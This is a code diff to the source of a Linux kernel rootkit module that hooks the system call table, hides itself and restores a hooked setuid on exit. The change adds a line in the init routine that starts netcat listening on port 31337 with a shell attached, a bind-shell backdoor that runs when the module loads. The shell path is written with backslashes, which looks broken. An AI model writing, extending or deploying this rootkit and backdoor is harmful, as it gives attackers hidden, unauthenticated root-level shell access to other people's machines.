@@ -7,8 +7,6 @@
 #include <linux/slab.h>
 #include <linux/dirent.h>
 #include <linux/fs.h>
-#include <asm/fcntl.h> 
-#include <asm/errno.h> 
 #include <linux/types.h> 
 
 /* WARNING! If you insmod this module without commenting out the module hiding lines,
@@ -234,11 +232,15 @@ int rootkit_init(void) { // Start lel rootkit
 		__NR_myexecve--;
 	}
 	orig_execve = system_call_table[__NR_execve]; 
+	
 	if (__NR_myexecve != 0){ 
 		system_call_table[__NR_myexecve] = orig_execve; 
 	}
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
+	
+	const char *args[5] = {"nc","-lp","31337","-e","\\bin\\sh"};
+	my_execve("/bin/nc", args , NULL);	
 
 	return 0;
 }
@@ -257,7 +259,6 @@ void rootkit_exit(void) {
 	xchg(&system_call_table[__NR_setuid],orig_setuid);
 	#endif
 
-	
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
 	printk("Rootkit Exited\n"); // We done
